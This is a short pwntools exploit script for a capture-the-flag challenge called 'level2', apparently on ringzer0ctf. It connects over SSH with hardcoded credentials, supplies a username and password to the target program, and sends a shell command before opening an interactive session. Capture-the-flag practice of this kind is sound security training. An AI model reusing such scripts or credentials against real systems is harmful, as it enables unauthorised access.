#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './level2')

if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.SSH:
        r = ssh(user='level2', host='challenges.ringzer0ctf.com', port=10080, password='TJyK9lJwZrgqc8nIIF6o', raw=True)
        return r.process(['/levels/level2'] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b'Username:', b'nobody')
io.sendlineafter(b'Password:', b'Ksdkjkk32avsh')
io.sendlineafter(b'Command:', b'echo foobar > lol')

io.interactive()

